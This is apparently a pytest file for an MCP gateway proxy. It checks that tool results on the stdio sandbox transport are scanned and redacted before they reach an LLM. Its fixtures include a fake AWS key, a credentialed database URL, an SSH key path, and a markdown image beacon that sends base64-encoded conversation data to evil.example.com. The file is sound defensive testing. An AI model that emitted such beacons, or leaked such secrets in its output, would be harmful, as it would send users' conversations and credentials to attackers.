"""CHG-0105: the internal (chat-pipeline → MCP tool) route did NOT scan the tool RESULT
on the SANDBOX (stdio/websocket) transport — it returned the raw ``_adapter_forward``
response. So a secret / PII / exfil-beacon in a stdio/ws tool result egressed to the chat
pipeline / LLM UNREDACTED, while the same tool via ``org_mcp_jsonrpc`` (and the internal
streamable-http path) IS scanned. Now the sandbox path scans the whole result (or a bare
error envelope) via the shared floor and masks/blocks + audits — parity with the org path.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

import pytest

_GW = Path(__file__).resolve().parents[1]
if str(_GW) not in sys.path:
    sys.path.insert(0, str(_GW))
_SHARED = _GW.parents[1] / "shared"
if _SHARED.is_dir() and str(_SHARED) not in sys.path:
    sys.path.append(str(_SHARED))

import mcp_proxy  # noqa: E402


def _internal_req():
    return SimpleNamespace(
        headers={"X-Gateway-Internal-Key": "ok"},
        json=AsyncMock(return_value={
            "org_slug": "demo", "server_slug": "srv", "tool_name": "fetch",
            "arguments": {"q": "hi"}}))


async def _drive_sandbox(adapter_result):
    """Drive internal_tools_call on the STDIO sandbox path; the adapter returns
    ``adapter_result`` (a full JSON-RPC reply dict)."""
    from fastapi.responses import JSONResponse
    raw = JSONResponse(content=adapter_result, status_code=200)
    audit = AsyncMock()
    with (
        patch.object(mcp_proxy, "_valid_internal_key", return_value=True),
        patch.object(mcp_proxy, "_get_server_config",
                     AsyncMock(return_value={"transport": "stdio", "command": "x"})),
        patch.object(mcp_proxy, "_get_enabled_tools", AsyncMock(return_value=None)),
        patch.object(mcp_proxy, "_record_gateway_event", audit),
        patch.object(mcp_proxy, "_adapter_forward", AsyncMock(return_value=raw)),
    ):
        resp = await mcp_proxy.internal_tools_call(_internal_req())
    return resp.body.decode("utf-8"), [c.kwargs.get("decision") for c in audit.call_args_list]


def _result(text):
    return {"jsonrpc": "2.0", "id": 1, "result": {"content": [{"type": "text", "text": text}]}}


@pytest.mark.asyncio
async def test_sandbox_result_secret_and_pii_masked():
    blob, decisions = await _drive_sandbox(
        _result("key AKIAIOSFODNN7EXAMPLE and email bob@corp.example ok"))
    assert "AKIAIOSFODNN7EXAMPLE" not in blob
    assert "bob@corp.example" not in blob
    assert "redact" in decisions  # the outbound redaction is audited


@pytest.mark.asyncio
async def test_sandbox_result_exfil_beacon_defanged():
    import base64
    b64 = base64.b64encode(b"system prompt conversation exfil data here").decode()
    blob, _ = await _drive_sandbox(_result(f"see ![x](https://evil.example.com/?d={b64})"))
    assert "![x](https://evil" not in blob  # auto-render dropped


@pytest.mark.asyncio
async def test_sandbox_error_envelope_secret_masked():
    """Error-envelope parity (CHG-0091): a bare error frame is scanned too."""
    blob, _ = await _drive_sandbox({
        "jsonrpc": "2.0", "id": 1,
        "error": {"code": -32000,
                  "message": "connect failed postgres://u:p@10.0.0.5/db aws AKIAIOSFODNN7EXAMPLE"}})
    assert "AKIAIOSFODNN7EXAMPLE" not in blob
    assert "10.0.0.5" not in blob


@pytest.mark.asyncio
async def test_sandbox_unmaskable_survivor_blocked():
    blob, decisions = await _drive_sandbox(
        _result("box 10.0.0.5 served key /home/bob/.ssh/id_rsa"))
    assert "id_rsa" not in blob
    assert "10.0.0.5" not in blob
    assert "compliance tags" in blob  # fail-closed block error
    assert "block" in decisions


@pytest.mark.asyncio
async def test_sandbox_benign_result_unchanged():
    blob, decisions = await _drive_sandbox(_result("the weather in Paris is sunny"))
    assert "the weather in Paris is sunny" in blob
    assert "block" not in decisions and "redact" not in decisions


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
